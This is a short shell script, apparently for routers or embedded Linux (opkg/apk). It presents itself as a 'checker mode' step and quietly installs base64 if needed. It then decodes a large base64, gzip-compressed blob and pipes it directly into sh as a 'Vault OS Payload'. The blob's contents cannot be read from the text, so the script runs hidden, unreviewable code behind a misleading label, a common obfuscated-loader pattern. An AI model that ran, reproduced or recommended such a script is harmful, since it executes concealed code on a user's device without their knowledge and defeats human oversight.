#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Preping dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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
OhXgCSgAAA=="

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
